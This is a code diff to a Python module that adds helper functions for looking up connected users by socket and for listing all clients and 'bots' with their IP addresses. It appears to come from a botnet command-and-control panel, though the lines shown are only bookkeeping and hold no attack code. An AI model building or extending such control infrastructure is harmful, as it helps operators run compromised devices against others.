@@ -5,13 +5,18 @@ class ServerConfig:
 
 class Strings:
 
+	CurrentUser = ""
+	CurrentIP = ""
+
 	appInfo = {
 		"appCreator": "Zerda",
 		"appOwner": "Exo",
-		"appDevs": "Zerda, Exo, clever, Max, Beta",
+		"appDevs": "Zerda, Exo",
 		"appAdmins": "Pressure",
 		"appVersion": "1.00"
 	}
+
+	
 
 	def hostname(name):
 		addName = "Net"
@@ -47,3 +52,33 @@ class Strings:
 		"Background_Reset": "\x1b[49m",
 		"Clear": "\033[2J\033[1;1H"
 	}
+
+	def GetCurrentUsername(socket):
+		for u in ServerConfig.clients:
+			if u[1] == socket:
+				return u[0]
+
+		return "[x] Failed!"
+
+	def GetCurrentIP(socket):
+		for u in ServerConfig.clients:
+			if u[1] == socket:
+				return u[2]
+
+		return "[x] Failed!"
+
+	def show_all_clients():
+		g = 0
+		client_list = ""
+		for u in ServerConfig.clients:
+			client_list += str(f"Socket ID: {g} | Username: {u[0]} | IP: {u[2]}\r\n")
+			g += 1
+		return client_list
+
+	def show_all_bots():
+		h = 0
+		bot_list = ""
+		for u in ServerConfig.bots:
+			bot_list += str(f"Socket ID: {h} | Device IP: {u[2]}\r\n")
+			h += 1
+		return bot_list
